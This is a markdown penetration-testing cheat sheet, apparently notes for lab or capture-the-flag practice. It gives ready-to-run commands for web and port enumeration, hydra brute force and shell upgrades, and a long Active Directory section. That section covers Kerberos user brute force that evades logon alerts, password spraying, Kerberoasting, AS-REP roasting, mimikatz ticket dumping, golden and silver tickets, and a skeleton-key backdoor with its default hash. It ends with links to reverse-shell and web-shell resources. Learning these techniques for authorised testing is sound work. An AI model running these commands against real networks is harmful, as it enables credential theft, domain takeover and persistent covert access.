# Web Apps

### Tools

- gobuster
- wfuzz
- dirsearch
- dirbuster

## Reconnaissance

#### Enumerate vhost w/ gobuster & wfuzz
```
Command : gobuster vhost -u <URL to fuzz> -w <wordlist>

  OR

Command : wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```
#### Enumerate dirs and files w/ gobuster & wfuzz
```
Command : gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist> -x "{extensions separte by comma}"

  OR

Command : wfuzz -u example.com/FUZZ.php -w <wordlist>
```
#### Enumerate parameters
```
Command : wfuzz -u {url}/?FUZZ=ls+-la -w <wordlist> --hw 2
```
# Linux

## Discovery & Scanning
#### Scan tcp ports w/ nmap & nc
```
Command : sudo nmap -sS -sV -T5 -v {domain/ip} -oG all_tcp.nmap

  OR

Command : nc -zv {domain/ip} 1-65535
```
#### Scan udp ports w/ nmap & nc
```
Command : sudo nmap -sU -sV -T5 -v {domain/ip} -oG all_udp.nmap

  OR

Command : nc -zuv {domain/ip} 1-65535
```
#### identify if you are in a container
```
Command : cat /proc/1/cgroup | grep -i "docker"

If this command returns any output you are in a docker container
```
## Vulnerability Assessment
#### Find Suid Bins w/ find
```
Command : find / -type f -perm -u=s 2> /dev/null

   OR

Command : find / -perm -4000 2>/dev/null
```

## Exploitation
#### Brute force services w/ hydra
```
Command : hydra -l {user} -P {wordlist - password} {domain/ip} {service}
```

## General
#### Web server
```
Command : python3 -m http.server

  OR

Command : python -m SimpleHTTPServer
```
#### Upgrade Shell to interactive
```
Command : python3 -c "import pty;pty.spawn('/bin/bash')"

Press : CTRL + Z

Command : stty raw -echo

Command : fg

Command : export TERM=xterm-256color

Command : export SHELL=bash

Command : stty rows 22 columns 140
```

#### RDP

```
Command: xfreerdp /u:"USER" /p:"PASSWORD" /d:"DOMAIN" /v:"IP" /dynamic-resolution /drive:shared,"FOLDER"
```

# Windows

## Enumeration

### Tools

- PowerView
- BloodHound
- SharpHound

#### PowerView

*Load PowerView script*

```
Command: powershell -ep bypass

Command: . .\PowerView.ps1
```

*Enumerate the domain users*

```
Command: Get-NetUser | select cn
```

*Enumerate the domain groups*

```
Command: Get-NetGroup -GroupName *admin* 
```

*Enumerate shared folders*
```
Invoke-ShareFinder
```

*Enumerate operate system on the network*
```
Get-NetComputer -fulldata | select operatingsystem
```

#### BloodHound

*Install and configure bloodhound*

```
Command: sudo apt install bloodhound

Command: sudo neo4j console

Command: sudo bloodhound
```

*Getting loot*

```
Command: powershell -ep bypass

Command: . .\SharpHound.ps1

Command: Invoke-Bloodhound -CollectionMethod All -Domain {Domain} -ZipFileName loot.zip

  OR

Command: SharpHound.exe -c all -d {Domain} --zipfilename loop.zip

```

## SMB

### Tools

- smbclient

#### Enumeration

*Enumerate shares*

```
Command : smbclient -U {USER} -L \\\\{IP/DOMAIN}\\
```

*Access to share*

```
Command : smbclient -U {USER} \\\\{IP/DOMAIN}\\{SHARE}
```

## Kerberos

### Tools

- kerbrute  - *Brute force and enumerate valid active-directory users*
- rubeus
- mimikatz

### Attacks

*Attack Privilege Requirements -*

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required

### Enumeration

#### Abusing Pre-Authentication

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

#### Enumerating Users w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist.
```
Command : ./kerbrute userenum --dc {domain_controler_KDC} -d {domain} {wordlist}
```
### Harvesting & Brute-Forcing Tickets

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

#### Harvesting Tickets w/Rubeus

This command tells Rubeus to harvest for TGTs every 30 seconds.
```
Command : .\Rubeus.exe harvest /interval:30
```
#### Brute-Forcing / Password-Spraying w/ Rubeus

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

This command will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.
```
Command : .\Rubeus.exe brute /password:{password} /noticket
```
### Kerberoasting

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

#### Kerberoasting w/ Rubeus

This will dump the Kerberos hash of any kerberoastable users.
```
Command : .\Rubeus.exe kerberoast
```
#### Kerberoasting w/ Impacket

This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domains; however, this does not have to be on the targets machine and can be done remotely.
```
Command : sudo python3 GetUserSPNs.py {domain}/{user}:{password} -dc-ip {domain_controller_ip} -request
```
#### Crack those Hashes w/ hashcat
```
Command : hashcat -m 13100 -a 0 {hash} {wordlists}

Command : john --wordlist={password} {hash}
```
### AS-REP Roasting

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

#### Dumping KRBASREP5 Hashes w/ Rubeus

This command will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
```
Command : .\Rubeus.exe asreproast
```

#### Dumping KRBASREP5 Hashes w/ Impacket GetNPUsers.py
```
Command : python3 GetNPUsers.py {Domain}/ -usersfile {UserList} -no-pass -dc-ip {IP}
```

#### Crack those Hashes w/ hashcat

crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 or John the ripper.
```
Command : hashcat -m 18200 {hash} {wordlist}

Command : john --format:krb5asrep {hash} --wordlist={wordlists}
```
### Pass the Ticket

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

#### Prepare Mimikatz & Dump Tickets
```
Command : .\mimikatz.exe

Ensure this command outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz.

Sub_Command : privilege::debug

this will export all of the .kirbi tickets into the directory that you are currently in.

Sub_command : sekurlsa::tickets /export

Command : klist
```
### KRBTGT

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

#### Golden/Silver Ticket Attack

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

#### Dump the KRBTGT Hash
```
Command : .\mimikatz.exe

ensure this outputs [privilege '20' ok]

Sub_Command : privilege::debug

This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

Sub_Command : lsadump::lsa /inject /name:krbtgt
```
#### Create a Golden/Silver Ticket

This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
```
Command : Kerberos::golden /user:Administrator /domain:controller.local /sid:{sid} /krbtgt:{krbtgt} /id:{id}
```
#### Use the Golden/Silver Ticket to access other machines
```
This will open a new elevated command prompt with the given ticket in mimikatz.

Command : misc::cmd
```
Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

### Kerberos Backdoors w/ mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

#### Skeleton Key

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
```
Command : .\mimikatz.exe

This should be a standard for running mimikatz as mimikatz needs local administrator access

Sub_Command : privilege::debug

Sub_Command : misc::skeleton
```
# Resources

### Reverse Shells

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - *Reverse shell repository*

[phpbash](https://github.com/Arrexel/phpbash) - *Php web shell*

[p0wny-shell](https://github.com/flozz/p0wny-shell) - *Php web shell*

[revshells](https://www.revshells.com/) - *Reverse shell generator*

### Cracking and Decoding

[CyberChef](https://gchq.github.io/CyberChef/) - *Decode or encode multiple variety of ciphers*

[dcode](https://www.dcode.fr/) - *Decode multiple variety of ciphers*

[CrackStation](https://crackstation.net/) - *Crack hashes online*

[tunnelsup](https://www.tunnelsup.com/hash-analyzer/) - *Hash Analyzer*

[onlinehashcrack](https://www.onlinehashcrack.com/hash-identification.php) - *Hash Analyzer*

### Abuse binaries.

[GTFOBins](https://gtfobins.github.io/) - *Abuse suid, guid binaries*

[Exploit-DB](https://www.exploit-db.com/) - *Database of knows exploits*

[libc_database](https://libc.blukat.me/) - *Database of multiple libc version*

### Privilege Escalation

[PEAS-ng](https://github.com/carlospolop/PEASS-ng) - *Windows, Linux & Mac privesc escalation tool*
